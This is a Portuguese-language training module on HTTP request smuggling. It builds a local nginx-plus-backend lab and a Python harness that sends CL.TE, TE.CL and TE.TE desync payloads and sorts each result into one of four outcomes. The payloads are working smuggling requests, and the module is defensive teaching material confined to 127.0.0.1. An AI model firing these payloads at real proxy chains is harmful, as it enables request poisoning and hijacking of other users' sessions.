# Módulo 5 — O Lab e o Harness de Desync

**Carga:** 3 horas (1h teoria · 2h lab)
**Pré-requisitos:** Módulos 1 a 4 · Parser Differentials (módulo 5)

---

## Objetivos

1. Montar uma **cadeia real** — nginx, haproxy, ou produtos, em container sem rede.
2. Instrumentar a **contagem por camada** — a medida do desync.
3. Escrever o **harness de desync** — e saber o que ele **não** faz.
4. Medir a **detecção** — distinguir "sem desync" de "rejeitado".
5. Produzir a **evidência que se reproduz** — com hashes e configuração.

---

## ⚠ Antes de começar

⚠ **A afirmação que organiza o módulo:**

> **A contagem é a medida.** **Você não "vê" um desync — você o conta** — **e a diferença entre a
> contagem de duas camadas é o fenômeno.**

⚠ **E é o mesmo instrumento do Parser Differentials, com uma torção:** **lá você contava o que cada
parser extraiu; aqui você conta o que cada **camada da cadeia** viu.** **E a cadeia tem proxies de
verdade.**

⚠ **A tese:**

> **O harness do desync tem quatro saídas, não duas.** **Não é "funcionou ou não" — é "sem efeito,
> desync, rejeitado, ou indeterminado".**

⚠ **A tabela das quatro saídas, e ela é o critério do módulo:**

| # | Saída | O que o backend viu | Significa |
|---|---|---|---|
| 1 | **Sem efeito** | 1 requisição, a esperada | ⚠ Não há desync nesta variante |
| 2 | ⚠ **Desync** | 2+ requisições, ou marca no log | ⚠⚠ **Funcionou** |
| 3 | **Rejeitado** | 0, e o frontend deu 4xx | ✓ **Imune** |
| 4 | ⚠ **Indeterminado** | 0, sem resposta | ⚠ Reconferir |

⚠ **A quarta linha é a que quase todos ignoram, e a que gera conclusões erradas.** **Silêncio não é
"não funciona"** — **é "o teste não foi conclusivo".** **E pode ser timeout, pode ser conexão
fechada, pode ser o proxy engolindo o payload.**

⚠ **A regra escrita:**

> **Quatro saídas, e três delas não são "funcionou".** **Concluir sem distinguir a quarta é o erro
> clássico.**

---

## 5.1 A cadeia real

⚠ **Até aqui, o lab foi didático.** **O módulo leva ao produto** — **e isso exige as três coisas.**

| Requisito | Por quê |
|---|---|
| **Container sem rede** | ⚠ Isolamento verificável |
| **Config visível** | Você lê a regra, não a supõe |
| **Log por camada** | ⚠ A contagem é a medida |

⚠ **E a tabela do que usar, por nível de realismo:**

| Nível | Frontend | Backend | Quando |
|---|---|---|---|
| Didático | `proxy_te.py` | `backend_cl.py` | ✓ Módulos 1–4 |
| **Produto leve** | nginx | `backend_cl.py` | ✓ **Comece aqui** |
| **Produto real** | nginx + haproxy | nginx | ⚠ Depois |
| Três camadas | nginx + cache + nginx | nginx | Módulo 8 |

⚠ **A linha do "produto leve" é a recomendada.** **O nginx é um proxy de verdade, com regras reais**
— **e o backend é seu, com log.** **É o melhor equilíbrio entre realismo e controle.**

⚠ **E a razão de não começar com três camadas:** **cada camada multiplica as combinações de regra.**
**Com duas, você tem uma variável; com três, tem três pares.**

⚠ **A tabela do que a config do nginx precisa deixar visível:**

| Diretiva | O que revela |
|---|---|
| `proxy_http_version` | A versão ao backend |
| `proxy_pass` | Como ele repassa |
| `proxy_set_header` | ⚠ **O que ele reescreve** |
| `client_max_body_size` | ⚠ Limite de corpo |
| `chunked_transfer_encoding` | ⚠ **O que ele faz com o TE** |

⚠ **A última linha é a mais importante.** **`chunked_transfer_encoding`** — **em `on` ou `off`** —
**decide se o nginx **reencoda** a mensagem.** **E reencodar pode **eliminar** ou **criar** a
divergência.**

⚠ **A regra escrita:**

> **Leia a config antes de testar.** **A diretiva que reencoda é a que decide se há divergência** —
> **e você não deve descobri-la por tentativa.**

```bash
mkdir -p ~/smuggle-lab/mod05 && cd ~/smuggle-lab/mod05

echo "═══ 1. a cadeia real ═══"
echo
cat > cadeia-real.md <<'EOF'
# A cadeia real

## Os três requisitos
| Requisito | Por quê |
|---|---|
| container SEM REDE | isolamento verificável |
| config VISÍVEL | você lê a regra, não a supõe |
| log POR CAMADA | ⚠ a contagem é a medida |

## Por nível de realismo
| Nível | Frontend | Backend | Quando |
|---|---|---|---|
| didático | proxy_te.py | backend_cl.py | módulos 1–4 |
| ⚠ PRODUTO LEVE | nginx | backend_cl.py | ⚠ comece aqui |
| produto real | nginx + haproxy | nginx | depois |
| três camadas | nginx + cache + nginx | nginx | módulo 8 |

## As diretivas que IMPORTAM no nginx
| Diretiva | O que revela |
|---|---|
| proxy_http_version | a versão ao backend |
| proxy_pass | como ele repassa |
| proxy_set_header | ⚠ o que ele REESCREVE |
| client_max_body_size | limite de corpo |
| ⚠ chunked_transfer_encoding | ⚠ o que ele faz com o TE |

## ⚠ a diretiva decisiva
`chunked_transfer_encoding on|off`
decide se o nginx REENCODA a mensagem.
⚠ e reencodar pode ELIMINAR ou CRIAR a divergência.

## ⚠ A REGRA
leia a config ANTES de testar.
a diretiva que reencoda é a que decide —
e você não deve descobri-la por TENTATIVA.
EOF

cat cadeia-real.md

echo
echo "═══ 2. a config, com a regra EXPLÍCITA ═══"
echo
cat > nginx-frontend.conf <<'EOF'
# /etc/nginx/conf.d/smuggle-lab.conf
#
# ⚠ LABORATÓRIO. escuta SÓ em 127.0.0.1.
#    nunca aponte isto para um serviço de terceiro.

server {
    listen 127.0.0.1:8081;

    # ⚠ A REGRA QUE DECIDE — deixe explícita para poder testar as duas
    chunked_transfer_encoding on;

    # ⚠ a versão falada com o backend (H1.1 = persistente)
    proxy_http_version 1.1;

    # ⚠ o que ele ADICIONA ao repassar
    proxy_set_header Host $host;
    proxy_set_header Connection "";

    # ⚠ o limite de corpo (o nginx RECUSA acima disso)
    client_max_body_size 1m;

    location / {
        proxy_pass http://127.0.0.1:8090;
    }
}
EOF

cat nginx-frontend.conf

echo
echo "═══ 3. o medidor de contagem POR CAMADA ═══"
echo
cat <<'EXPL'
  ── A INSTRUMENTAÇÃO ──

     FRONTEND (nginx):
        · o access_log dele dá a contagem do que ELE atendeu
        · ⚠ e o que ele repassou

     BACKEND (o seu):
        · o log dele dá a contagem do que ELE processou
        · ⚠ é a medida principal

     ── A MEDIDA ──
        ⚠ backend_visto - frontend_visto = o deslocamento

     ── E O QUE REGISTRAR ──
        · a contagem de cada camada
        · o PATH que o backend viu
        · ⚠ a marca que o atacante escreveu
        · e a resposta do frontend (200? 400?)
EXPL
```

⚠ **A config do nginx é o entregável do módulo.** **E ela é explícita de propósito:** **você comenta a
diretiva decisiva** — **para poder trocá-la e medir a diferença.**

⚠ **E a linha `chunked_transfer_encoding on` é o que você muda para `off` e retesta.** **É o
experimento controlado.**

**Produza `cadeia-real.md`:**

| Nível | Frontend | Backend |
|---|---|---|
| Didático | | |
| Produto leve | | |

**Responda:**

1. **Quais são os três requisitos** da cadeia real?
2. **Qual diretiva do nginx decide** se há divergência?
3. **Por que começar com duas camadas?**
4. **O que a config explícita permite testar?**

---

## 5.2 As quatro saídas

⚠ **O critério do harness. E ele é mais fino que o do Parser Differentials.**

| Saída | Detecção | ⚠ Ação |
|---|---|---|
| **Sem efeito** | 1 requisição, sem marca | Teste outra variante |
| ⚠ **Desync** | 2+, ou marca no log | ⚠ **Reproduza e documente** |
| **Rejeitado** | 4xx do frontend | ✓ **Imune — registre** |
| ⚠ **Indeterminado** | 0, sem resposta | ⚠ **Reconferir com timeout maior** |

⚠ **A distinção entre as saídas 3 e 4 é o que o módulo ensina.** **"Rejeitado" tem resposta; "incerto"
não tem.** **E confundir os dois é a fonte de conclusões erradas** — **nos dois sentidos:**
**declarar imune um alvo que só deu timeout, e declarar desync um que só travou.**

⚠ **A tabela das causas da saída 4:**

| Causa | O que fazer |
|---|---|
| Timeout do harness | ⚠ Aumentar e repetir |
| O frontend fechou a conexão | Reconferir com `Connection: keep-alive` |
| O payload era grande demais | ⚠ Reduzir |
| O backend travou | Ver o log dele |
| ⚠ **O desync é assíncrono** | ⚠ **Repetir com o servidor calmo** |

⚠ **A última linha é a mais importante, e a mais honesta.** **O desync depende da ordem de chegada**
— **e num servidor ocupado, a ordem é imprevisível.** **Um resultado indeterminado pode ser um
desync que não se concretizou naquele instante.**

⚠ **A regra escrita:**

> **"Não funcionou" e "não sei" são coisas diferentes.** **Você só declara a primeira quando tem
> resposta — e só declara a segunda quando reconferiu.**

```bash
cd ~/smuggle-lab/mod05

echo "═══ 4. as quatro saídas ═══"
echo
cat > quatro-saidas.md <<'EOF'
# As quatro saídas

| Saída | Detecção | Ação |
|---|---|---|
| SEM EFEITO | 1 requisição, sem marca | teste outra variante |
| ⚠ DESYNC | 2+, ou marca no log | ⚠ reproduza e documente |
| REJEITADO | 4xx do frontend | ✓ imune — registre |
| ⚠ INDETERMINADO | 0, sem resposta | ⚠ RECONFERIR |

## ⚠ a distinção que importa
"REJEITADO" tem resposta.
"INCERTO" não tem.
⚠ confundir os dois gera conclusões erradas NOS DOIS SENTIDOS:
   · declarar imune um alvo que só deu timeout
   · declarar desync um que só travou

## As causas da saída 4
| Causa | O que fazer |
|---|---|
| timeout do harness | aumentar e repetir |
| o frontend fechou a conexão | reconferir com keep-alive |
| payload grande demais | reduzir |
| o backend travou | ver o log dele |
| ⚠ o desync é ASSÍNCRONO | ⚠ repetir com o servidor CALMO |

## ⚠ a linha mais honesta
o desync depende da ORDEM DE CHEGADA.
num servidor ocupado, a ordem é imprevisível.
✓ um resultado indeterminado pode ser um desync
   que não se concretizou NAQUELE instante.

## ⚠ A REGRA
"não funcionou" e "não sei" são coisas DIFERENTES.
você só declara a primeira quando tem resposta —
e só declara a segunda quando RECONFERIU.
EOF

cat quatro-saidas.md

echo
echo "═══ 5. as três medidas por variante ═══"
echo
cat <<'EXPL'
  ── PARA CADA VARIANTE, MEÇA TRÊS COISAS ──

     1. A CONTAGEM
        · quantas requisições o backend viu

     2. A MARCA
        · ⚠ a string que o atacante escreveu no pedido escondido
        · apareceu no log do backend?
        ✓ é a prova LITERAL

     3. A RESPOSTA
        · o frontend respondeu 200? 400?
        ⚠ a resposta diz se ELE detectou a ambiguidade

  ── E A COMBINAÇÃO DAS TRÊS DÁ A SAÍDA ──
     contagem 2+  ou marca presente  → ⚠ DESYNC
     contagem 1, sem marca            → sem efeito
     4xx                              → rejeitado
     nada                             → ⚠ indeterminado

  ⚠ e a marca é o mais forte dos três:
     ela não depende de interpretação.
EXPL
```

⚠ **As três medidas são o instrumento do harness.** **E a marca é a mais forte** — **porque é
literal: a string apareceu onde não devia.**

⚠ **E a resposta do frontend é o que distingue imune de vulnerável.** **Um proxy que responde 400 na
ambiguidade está **defendendo** — **e isso é resultado, não fracasso.**

**Produza `quatro-saidas.md`:**

| Saída | Detecção | Ação |
|---|---|---|
| Sem efeito | | |
| Desync | | |
| Rejeitado | | |
| Indeterminado | | |

**Responda:**

1. **O que distingue "rejeitado" de "indeterminado"?
2. **Por que confundir os dois gera erro nos dois sentidos?**
3. **Qual é a medida mais forte das três?** Por quê?
4. **Por que o desync pode ser assíncrono?**

---

## 5.3 O harness de desync

⚠ **O harness: cinco partes, e as saídas são quatro.**

| Parte | O que faz |
|---|---|
| **O payload** | A variante, com a marca |
| **O limpo** | ⚠ Uma requisição de **limpeza** depois |
| **O contador** | Lê o log do backend |
| **O leitor de resposta** | Distingue 4xx de silêncio |
| **O classificador** | ⚠ Dá uma das **quatro** saídas |

⚠ **A parte do **limpo** é a que quase todos esquecem.** **Depois do payload, você manda uma
requisição **normal** e com uma marca distinta.** **Se o desync ocorreu, o **backend** vê a limpa
deslocada** — **e é a limpa que confirma.**

⚠ **A tabela do que a limpa revela:**

| Resultado | Significa |
|---|---|
| O backend vê 2 (payload + limpa) | ⚠ Desync confirmado |
| O backend vê 1 (só a limpa) | Sem efeito — o payload sumiu |
| O backend vê 0 | ⚠ Indeterminado |

⚠ **A linha 1 é a confirmação.** **E é mais forte que a marca** — **porque o desync é sobre a
**próxima** requisição, não sobre a sua.**

⚠ **A regra escrita:**

> **A limpeza é a prova.** **O payload deixa o estado deslocado; a limpeza mostra o deslocamento** —
> **porque é ela que cai no lugar errado.**

```bash
cd ~/smuggle-lab/mod05

echo "═══ 6. o harness de desync ═══"
echo
cat > harness-desync.py <<'PY'
#!/usr/bin/env python3
"""
harness-desync.py — o medidor de desync com as QUATRO saídas.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
   ele NÃO conclui "há um bug" — dá a medida e a saída.
"""
import socket, sys, os, time, uuid

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = sys.argv[2] if len(sys.argv) > 2 else os.path.expanduser(
    "~/smuggle-lab/evidencia/backend-cl.log")

# ⚠ a MARCA — a string que o atacante escreve no pedido escondido.
#    ela é a prova literal: se aparecer no log do backend, o desync ocorreu.
MARCA = f"SMUG{uuid.uuid4().hex[:8]}"
LIMPA = f"LIMPA{uuid.uuid4().hex[:6]}"


def conta_log():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def envia(payload: bytes, timeout=5):
    """manda e devolve (respondeu?, status, sem_resposta)"""
    try:
        with socket.create_connection((HOST, PORT), timeout=timeout) as s:
            s.sendall(payload)
            s.settimeout(2)
            try:
                r = s.recv(8192)
                if not r:
                    return True, "(conexão fechada)", False
                linha = r.split(b"\r\n")[0].decode(errors="replace")
                return True, linha, False
            except socket.timeout:
                return True, "(sem resposta)", False
    except Exception as e:
        return False, f"({type(e).__name__})", True


def monta_payload(variante: str) -> bytes:
    if variante == "CL.TE":
        return (b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
                b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
                b"GET /" + MARCA.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n")
    if variante == "TE.CL":
        return (b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 4\r\n"
                b"Transfer-Encoding: chunked\r\n\r\n"
                b"5c\r\nGET /" + MARCA.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n"
                + b"x" * 40 + b"\r\n0\r\n\r\n")
    if variante == "TE.TE":
        return (b"POST / HTTP/1.1\r\nHost: l\r\n"
                b"Transfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n"
                b"0\r\n\r\nGET /" + MARCA.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n")
    return b""


def roda(variante: str) -> str:
    """retorna uma das QUATRO saídas"""
    antes, _ = conta_log()

    p = monta_payload(variante)
    if not p:
        return "SEM EFEITO"

    respondeu, status, sem_resp = envia(p)
    time.sleep(0.3)

    # ── A LIMPEZA ──
    limpa = (b"GET /" + LIMPA.encode() + b" HTTP/1.1\r\nHost: l\r\n"
             b"Connection: keep-alive\r\n\r\n")
    try:
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            s.sendall(limpa)
            s.settimeout(2)
            try: s.recv(4096)
            except socket.timeout: pass
    except Exception:
        pass
    time.sleep(0.4)

    depois, txt = conta_log()
    n = depois - antes

    marca_apareceu = MARCA in txt
    limpa_apareceu = LIMPA in txt

    print(f"     status do frontend : {status}")
    print(f"     backend viu        : {n} nova(s)")
    print(f"     ⚠ marca aparece    : {'SIM' if marca_apareceu else 'não'}")
    print(f"     limpeza aparece    : {'SIM' if limpa_apareceu else 'não'}")

    # ── AS QUATRO SAÍDAS ──
    if marca_apareceu or n >= 3:
        return "⚠ DESYNC"
    if status.startswith("HTTP/1.1 4") or status.startswith("HTTP/1.1 5"):
        return "REJEITADO"
    if sem_resp or (n == 0 and not limpa_apareceu):
        return "⚠ INDETERMINADO"
    return "SEM EFEITO"


def main():
    print("═══ HARNESS DE DESYNC ═══")
    print()
    print(f"  frontend: {HOST}:{PORT}   ⚠ LOCAL")
    print(f"  log     : {LOG}")
    print(f"  marca   : {MARCA}")
    print()

    for v in ("CL.TE", "TE.CL", "TE.TE"):
        print(f"  ── {v} ──")
        saida = roda(v)
        print(f"     → {saida}")
        print()

    print("  ═══ AS QUATRO SAÍDAS ═══")
    print("  · SEM EFEITO   → teste outra variante")
    print("  · ⚠ DESYNC      → reproduza e documente")
    print("  · REJEITADO    → ✓ imune, registre")
    print("  · ⚠ INDETERMINADO → reconfira com timeout maior")
    print()
    print("  ⚠ este harness NÃO conclui 'há um bug'.")
    print("     ele dá a MEDIDA e a SAÍDA.")


if __name__ == "__main__":
    main()
PY

chmod +x harness-desync.py

echo "  ── o harness está pronto ──"
echo "     python3 ~/smuggle-lab/mod05/harness-desync.py 8081"
```

⚠ **O harness implementa as quatro saídas.** **E ele faz as **três** medidas** — contagem, marca e
resposta — **porque uma sozinha engana.**

⚠ **E a limpeza é o diferencial.** **Depois do payload, a requisição normal mostra o deslocamento** —
**porque é ela que cai no lugar errado.**

**Produza `harness.md`:**

| Parte | O que faz |
|---|---|
| Payload | |
| Limpo | |
| Contador | |
| Leitor de resposta | |
| Classificador | |

**Responda:**

1. **O que a limpeza revela?** Por que é necessária?
2. **O que são as três medidas?** Qual é a mais forte?
3. **O que o harness NÃO conclui?**
4. **Cite as quatro saídas.**

---

## 5.4 LAB — O harness contra a cadeia real

**Duração:** 120 min

### Passo 1 — Monte o nginx (45 min)

⚠ **O produto real, em 127.0.0.1.**

```bash
cd ~/smuggle-lab/mod05

echo "═══ MONTANDO O NGINX ═══"
echo
cat <<'EXPL'
  ── O QUE FAZER ──

     1. copie a config para um lugar que você controle
        (não sobrescreva o nginx do sistema, se houver)

     2. rode o nginx em foreground, com a SUA config:
        nginx -c ~/smuggle-lab/mod05/nginx-frontend.conf -g 'daemon off;'

     ⚠ se preferir, use docker:
        docker run --rm --network none -v ~/smuggle-lab:/lab \
          -p 127.0.0.1:8081:8081 nginx:alpine

     3. e o backend:
        python3 ~/smuggle-lab/backends/backend_cl.py 8090

  ── ⚠ O ISOLAMENTO ──
     escuta só em 127.0.0.1.
     e o teste: um curl que FALHA (módulo 2 do Parser Differentials).
EXPL

# verifica se o nginx está disponível
printf '  ── nginx: '; (nginx -v 2>&1 | head -1) || echo "⚠ ausente — use docker"
echo

echo "═══ E A VERIFICAÇÃO DE ISOLAMENTO ═══"
cat <<'EXPL'
     # a config escuta em 127.0.0.1? confira:
     grep -n 'listen' ~/smuggle-lab/mod05/nginx-frontend.conf

     # e o teste que FALHA (de dentro do container, se usar docker):
     docker run --rm --network none nginx:alpine \
       curl -s --max-time 3 http://example.com \
       && echo "⚠⚠ ALCANÇOU" || echo "✓ não alcançou"
EXPL

cat > ~/smuggle-lab/evidencia/cadeia-real.md <<'EOF'
# A cadeia real

## Os componentes
| Camada | Produto | Versão | Porta | Config |
|---|---|---|---|---|
| frontend | nginx | | 127.0.0.1:8081 | nginx-frontend.conf |
| backend | backend_cl.py | — | 127.0.0.1:8090 | — |

## O isolamento
| Item | Valor |
|---|---|
| escuta em | 127.0.0.1 |
| rede de saída | ⚠ NENHUMA |
| teste que falha | [ ] feito — resultado |

## As diretivas que importam
| Diretiva | Valor | ⚠ Efeito |
|---|---|---|
| chunked_transfer_encoding | | decide o reencode |
| proxy_http_version | | a versão ao backend |
| client_max_body_size | | limite |

## O experimento controlado
| Config | O que espero |
|---|---|
| `chunked_transfer_encoding on` | |
| `chunked_transfer_encoding off` | |
EOF

cat ~/smuggle-lab/evidencia/cadeia-real.md
```

⚠ **O experimento controlado é o que o módulo entrega.** **Você roda com `on`, depois com `off`** —
**e mede a diferença.** **É o método do Patch Diffing, aplicado à config.**

⚠ **E a verificação de isolamento continua obrigatória.** **Tudo em 127.0.0.1, e o teste que falha.**

**Produza `nginx-montado.md`:**

| Item | Valor |
|---|---|
| Versão do nginx | |
| Escuta em | |
| `chunked_transfer_encoding` | |
| Isolamento testado? | |

**Responda:**

1. **O nginx está rodando?** Em qual endereço?
2. **Qual o valor da diretiva decisiva?
3. **O teste de isolamento passou?**
4. **O que o experimento controlado vai mostrar?**

### Passo 2 — Rode o harness e meça (50 min)

⚠ **As três variantes, com as quatro saídas, no produto real.**

```bash
cd ~/smuggle-lab

echo "═══ RODANDO O HARNESS ═══"
echo
cat <<'EXPL'
  ── COM O NGINX E O BACKEND NO AR ──

     python3 ~/smuggle-lab/mod05/harness-desync.py 8081 \
             ~/smuggle-lab/evidencia/backend-cl.log

  ── E, EM PARALELO, O LOG ──
     tail -f ~/smuggle-lab/evidencia/backend-cl.log
EXPL

cat > caderno/PD-005.md <<'EOF'
# PD-005 — o harness de desync

**Data:** ____

## 1. A cadeia
| Camada | Produto | Versão | Porta |
|---|---|---|---|
| frontend | | | |
| backend | | | |

## 2. A config decisiva
| Diretiva | Valor |
|---|---|
| chunked_transfer_encoding | |
| proxy_http_version | |

## 3. As três variantes
| Variante | Status | Backend viu | Marca apareceu | ⚠ SAÍDA |
|---|---|---|---|---|
| CL.TE | | | | |
| TE.CL | | | | |
| TE.TE | | | | |

## 4. O experimento controlado
| Config | Resultado |
|---|---|
| `chunked_transfer_encoding on` | |
| `chunked_transfer_encoding off` | |
| ⚠ a diferença | |

## 5. A evidência literal
```
comando
```
```
[nginx]
```
```
[backend]
```

## 6. As quatro saídas — o que apareceu
| Saída | Quantas variantes |
|---|---|
| sem efeito | |
| ⚠ desync | |
| rejeitado | |
| ⚠ indeterminado | |

## 7. ⚠ O que eu NÃO fiz
- [ ] não apontei para serviço de terceiro
- [ ] não testei em produção
- [ ] não usei o desync para acessar nada
- [ ] não publiquei nada

## 8. O que NÃO foi verificado
⚠ mínimo 3

## 9. O que isso destrava
| # | Próxima variante | Prioridade |
EOF

cat caderno/PD-005.md | head -28
```

⚠ **O harness no produto real é o entregável.** **E a coluna "saída" é o que separa as quatro
possibilidades** — **em vez de "funcionou ou não".**

⚠ **E a ficha registra quantas variantes caíram em cada saída.** **É a medida honesta do resultado.**

**Produza `resultado.md`:**

| Variante | Backend viu | Marca | Saída |
|---|---|---|---|
| CL.TE | | | |
| TE.CL | | | |
| TE.TE | | | |

**Responda:**

1. **Quantas variantes deram desync?**
2. **Alguma foi rejeitada?** Qual?
3. **Alguma ficou indeterminada?** O que fazer?
4. **O experimento controlado mostrou diferença?**

### Passo 3 — A evidência que se reproduz (25 min)

⚠ **O entregável final: a evidência com hashes e config.**

```bash
cd ~/smuggle-lab

echo "═══ A EVIDÊNCIA REPRODUTÍVEL ═══"
echo
cat > evidencia/relatorio-desync.md <<'EOF'
# Evidência — desync

## 1. A cadeia, com versões e hashes
| Camada | Produto | Versão | Hash / imagem |
|---|---|---|---|
| frontend | | | |
| backend | | | |

## 2. A configuração (literal)
```
[cole a config do nginx — as diretivas que importam]
```

## 3. O endereçamento
| Item | Valor |
|---|---|
| frontend | 127.0.0.1:____ |
| backend | 127.0.0.1:____ |
| ⚠ terceiros envolvidos | **NENHUM** |

## 4. O payload (bytes literais)
```
[cole o payload em hex ou repr]
```

## 5. A medida
| Variante | Status | Backend viu | Marca | Saída |
|---|---|---|---|---|
| | | | | |

## 6. O log literal
```
[frontend]
```
```
[backend]
```

## 7. A reprodução
```
o comando exato
```
```
o resultado observado
```
⚠ determinístico?  [ ] sim  [ ] não — se não, descreva a variação

## 8. ⚠ O que eu NÃO fiz
- [ ] não apontei para CDN, WAF ou qualquer host de terceiro
- [ ] não testei em produção
- [ ] não usei o desync para ACESSAR nada
- [ ] não mandei payload a serviço que não é meu
- [ ] não publiquei

## 9. O que NÃO foi verificado
⚠ mínimo 3:
-
-
-

## 10. O que o mantenedor precisa confirmar
| # | Item |
|---|---|
| 1 | a cadeia existe assim em produção? |
| 2 | o backend lê o corpo neste endpoint? |
EOF

cat evidencia/relatorio-desync.md

echo
echo "═══ ⚠ E O QUE TORNA A EVIDÊNCIA VÁLIDA ═══"
cat <<'EXPL'
  ✓ VERSÃO de cada camada (não "o nginx")
  ✓ CONFIG literal (não "configurado com...")
  ✓ PAYLOAD em bytes (não "um payload com TE")
  ✓ LOG literal (não "o backend registrou 2")
  ✓ COMANDO exato (para reproduzir)
  ✓ DETERMINISMO declarado
  ✓ e o "NÃO FIZ" — o que você não testou

  ⚠ sem os sete, o relatório é uma ALEGAÇÃO.
EOF
```

⚠ **Os sete itens são o padrão de evidência.** **E o último — o "não fiz" — é o que torna o
relatório defensável.**

⚠ **E a nota do determinismo é honesta:** **um desync que funciona 1 em 10 vezes é um achado** —
**mas você declara a taxa.**

**Produza `evidencia-final.md`:**

| Item | Valor |
|---|---|
| Versões registradas? | |
| Config literal? | |
| Payload em bytes? | |
| Determinismo declarado? | |
| "Não fiz" preenchido? | |

**Responda:**

1. **Cite os sete itens** da evidência válida.
2. **Por que o "não fiz" importa?**
3. **O desync foi determinístico?**
4. **O que o mantenedor precisa confirmar?**

### Critérios de aceitação

- `cadeia-real.md` com os **três** requisitos e os **quatro** níveis.
- Você explicou **qual diretiva do nginx decide** se há divergência.
- Você explicou **por que config explícita permite experimento**.
- `nginx-frontend.conf` com a diretiva decisiva **comentada**.
- A config escuta **só em 127.0.0.1**.
- `quatro-saidas.md` com as **quatro** saídas e a ação de cada.
- Você explicou **a diferença entre "rejeitado" e "indeterminado"**.
- Você explicou **por que confundir os dois gera erro nos dois sentidos**.
- Você explicou **por que o desync pode ser assíncrono**.
- `harness-desync.py` com as **cinco** partes.
- Você explicou **o que a limpeza revela**.
- Você explicou **as três medidas** e qual é a mais forte.
- O **nginx** rodando em 127.0.0.1, com a config sua.
- O **teste de isolamento** feito, com resultado.
- O **experimento controlado** (`chunked_transfer_encoding on` × `off`).
- As **três variantes** medidas, com a saída classificada.
- `caderno/PD-005.md` com as **nove** seções.
- `evidencia/relatorio-desync.md` com os **sete** itens.
- Você declarou **o determinismo**.
- ⚠ **Nenhum serviço de terceiro.** Tudo em 127.0.0.1.

---

## Avaliação

1. **Por que a contagem é a medida?**
2. **Cite os três requisitos** da cadeia real.
3. **Qual nível de realismo começar?** Por quê?
4. **Por que não começar com três camadas?**
5. **Qual diretiva do nginx decide** a divergência? Por quê?
6. **Cite cinco diretivas** que revelam a regra.
7. **O que o reencode pode fazer** com a divergência?
8. **Cite as quatro saídas** do harness.
9. **O que distingue a 3 da 4?**
10. **Por que confundir as duas gera erro** nos dois sentidos?
11. **Cite quatro causas da saída indeterminada.**
12. **Por que o desync pode ser assíncrono?**
13. **Cite as cinco partes** do harness.
14. **O que a limpeza revela?** Por que é necessária?
15. **Cite as três medidas.** Qual é a mais forte?
16. **Por que a marca é mais forte** que a contagem?
17. **O que o harness NÃO conclui?**
18. **Cite os sete itens** da evidência válida.
19. **Por que declarar o determinismo?**
20. **O que separa um relatório de uma alegação?**

---

**Próximo:** [Módulo 6 — HTTP/2 e o descenso](modulo-06.md)
